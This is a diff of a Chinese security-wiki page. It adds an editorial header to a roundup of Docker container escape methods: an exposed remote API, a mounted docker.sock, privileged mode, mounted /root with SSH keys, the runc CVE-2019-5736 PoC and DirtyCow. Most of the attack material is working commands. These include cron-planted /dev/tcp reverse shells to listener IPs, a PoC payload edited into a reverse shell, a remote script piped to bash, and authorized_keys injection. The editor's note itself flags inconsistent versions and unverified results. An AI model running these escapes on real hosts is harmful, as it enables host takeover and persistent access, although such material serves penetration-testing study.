@@ -1,8 +1,57 @@
 ---
-cve: "CVE-2019-5736"
+cve: "CVE-2019-5736; CVE-2019-14271; CVE-2016-5195"
+title: "技术干货 Docker 容器逃逸案例汇集"
+product: "Docker/runc/Linux kernel"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2019-5736; CVE-2019-14271; CVE-2016-5195"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "各链有独立版本和能力条件，rootless/userns/LSM、宿主触发和底层内核均重要"
+source_url: "https://mp.weixin.qq.com/s/zfCcbDKc-ncYBOGXI5j4Vw"
+source_status: "recorded"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-fc9ce3efcf28c59feb941fbb"
+entity_id: "ve-fc9ce3efcf28c59feb941fbb"
+schema_version: "1"
 ---
 
-# 技术干货   Docker 容器逃逸案例汇集
+# 技术干货 Docker 容器逃逸案例汇集
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：各链有独立版本和能力条件，rootless/userns/LSM、宿主触发和底层内核均重要
+- 证据范围：相比33包含runc/DirtyCow实操与cp概述，不能按同CVE删为重复；应保留多实体并校正
+
+### 本次正文校订
+
+- 移除 45 组不含任何正文的空代码围栏；保留全部非空代码。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 多余围栏和反引号使全文代码分裂/黏连
+- ps -a被标启动容器实际仅列出；socket挂载称docker-in-docker应区分共享宿主daemon
+- runc <rc6和32条<=rc6不一致，Docker边界<18.09.2也与32冲突
+- 示例容器ID先248后cafa，cron路径说明/命令不一致
+- DirtyCow仅Ubuntu发行版号不足确认内核未修复
+- 下载gist即bash的环境脚本未经固定版本，须只用于隔离实验并回源审查
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zfCcbDKc-ncYBOGXI5j4Vw)
@@ -69,61 +118,21 @@ Docker 容器逃逸案例：
 
 漏洞简述：docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。
 
-```
-
-
-```
 sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
-```
-
-
-
-
-```
 
 通过docker daemon api 执行docker命令。
 
-```
-
-
-```
 `#列出容器信息，效果与docker ps一致。``curl http://<target>:2375/containers/json``#启动容器``docker -H tcp://<target>:2375 ps -a`
-```
-
-
-
-
-```
 
 漏洞利用：
 
 1、新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。
 
-```
-
-
-```
 sudo docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash
-```
-
-
-
-
-```
 
 2、在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root
 
-```
-
-
-```
 echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1' >> /mnt/var/spool/cron/crontabs/root
-```
-
-
-
-
-```
 
 3、本地监听端口，获取对方宿主机shell。
 
@@ -133,75 +142,25 @@ echo '* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1' >> /mnt/var/spoo
 
 场景描述：简单来说就是docker in docker，在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker.sock文件挂载到容器中，具体为：
 
-```
-
-
-```
 `docker run --rm -it \` `-v /var/run/docker.sock:/var/run/docker.sock \` `-v /usr/bin/docker:/usr/bin/docker \` `ubuntu \` `/bin/bash`
-```
-
-
-
-
-```
 
 漏洞测试：
 
 1、在容器中找到docker.sock
 
-```
-
-
-```
 `root@95a280bc5a19:/# find / -name docker.sock``/run/docker.sock`
-```
-
-
-
-
-```
 
 2、在容器查看宿主机docker信息：
 
-```
-
-
-```
 docker -H unix:///var/run/docker.sock info
-```
-
-
-
-
-```
 
 3、运行一个新容器并挂载宿主机根路径：
 
-```
-
-
-```
 docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash
-```
-
-
-
-
-```
 
 4、在新容器的/test 目录下，就可以访问到宿主机的全部资源，接下来就是写入ssh密钥或者写入计划任务，获取shell。
 
-```
-
-
-```
 ls -al /test
-```
-
-
-
-
-```
 
 ![图片](https://mmbiz.qpic.cn/mmbiz_png/ia0LvkyJzB4lJibPwBiaaXRzOpJjuXx4QaibHdYh8kIElTnibnQIUu2BibndVrfbYhtOVTz8njyqOwdERR8iaibdU3pwfA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
 
@@ -211,17 +170,7 @@ ls -al /test
 
 docker中存在一些比较高危的启动命令，给予容器较大的权限，允许执行一些特权操作，在一定的条件下，可以导致容器逃逸。
 
-```
-
-
-```
 `docker run --rm -it ``    --privileged ``    -v /:/soft ``    --cap-add=SYS_ADMIN ``    --net=host  ``    --pid=host    ``    --ipc=host ``    ubuntu ``    /bin/bash`
-```
-
-
-
-
-```
 
 **特权模式（—privileged）**
 
@@ -231,24 +180,10 @@ docker中存在一些比较高危的启动命令，给予容器较大的权限�
 
 A、通过特权模式运行一个容器：
 
-```
-
-
-```
 sudo docker run -itd --privileged ubuntu:latest /bin/bash
-```
-
-
-
-
-```
 
 B、在容器内，查看磁盘文件
 
-```
-
-
-```
 fdisk -l
 ```
 
@@ -259,31 +194,11 @@ fdisk -l
 
 C、将/dev/sda1 挂载到新建目录
 
-```
-
-
-```
 `mkdir /test``mount /dev/sda1 /test`
-```
-
-
-
-
-```
 
 D、将计划任务写入到宿主机
 
-```
-
-
-```
 echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.172.136/12345 0>&1' >> /test/var/spool/cron/crontabs/root
-```
-
-
-
-
-```
 
 E、开启nc监听，成功获取宿主机反弹回来的shell。
 
@@ -295,31 +210,11 @@ E、开启nc监听，成功获取宿主机反弹回来的shell。
 
 1、将宿主机root目录挂载到容器
 
-```
-
-
-```
 docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
-```
-
-
-
-
-```
 
 2、模拟攻击者写入ssh密钥
 
-```
-
-
-```
 `mkdir /root/.ssh``cat id_rsa.pub >> /root/.ssh/authorized_keys`
-```
-
-
-
-
-```
 
 3、利用私钥成功登录。获取宿主机权限。
 
@@ -331,17 +226,7 @@ docker run -itd -v /root:/root ubuntu:18.04 /bin/bash
 
 Docker 通过Linux namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。
 
-```
-
-
-```
 `--cap-add=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。``--net=host           启动时，绕过Network Namespace``--pid=host              启动时，绕过PID Namespace``--ipc=host              启动时，绕过IPC Namespace`
-```
-
-
-
-
-```
 
 ###   
 
@@ -375,61 +260,21 @@ Docker版本 < 18.09.2，runc版本< 1.0-rc6，一般情况下，可通过 docke
 
 1、测试环境镜像下载安装：
 
-```
-
-
-```
 curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh
-```
-
-
-
-
-```
 
 2、下载POC，修改脚本，编译
 
-```
-
-
-```
 `下载poc``git clone https://github.com/Frichetten/CVE-2019-5736-PoC``#修改Payload``vi main.go``payload = "#!/bin/bash \n bash -i >& /dev/tcp/192.168.172.136/1234 0>&1"``编译生成payload``CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go``拷贝到docker容器中执行` `sudo docker cp ./main 248f8b7d3c45:/tmp`
-```
-
-
-
-
-```
 
 3、模仿攻击者，在容器中执行payload
 
-```
-
-
-```
 `# 进入容器``sudo docker exec -it 248f8b7d3c45 /bin/bash``# 修改权限``chmod 777 main``# 执行Payload``./main`
-```
-
-
-
-
-```
 
 
 
 4、假设，管理员通过exec进入容器，从而触发Payload。  
 
-```
-
-
-```
 sudo docker exec -it  cafa20cfb0f9 /bin/sh
-```
-
-
-
-
-```
 
 5、在192.168.172.136上监听本地端口，成功获取宿主机反弹回来的shell。
 
@@ -465,31 +310,11 @@ docker与宿主机共享内核，因此我们需要存在dirtyCow漏洞的宿主
 
 2、测试容器下载并运行：
 
-```
-
-
-```
 `git clone https://github.com/gebl/dirtycow-docker-vdso.git``cd dirtycow-docker-vdso/``sudo docker-compose run dirtycow /bin/bash`
-```
-
-
-
-
-```
 
 3、进入容器，编译POC并执行:
 
-```
-
-
-```
 `cd /dirtycow-vdso/``make``./0xdeadbeef 192.168.172.136:1234`
-```
-
-
-
-
-```
 
 4、在192.168.172.136监听本地端口，成功接收到宿主机反弹的shell。
 
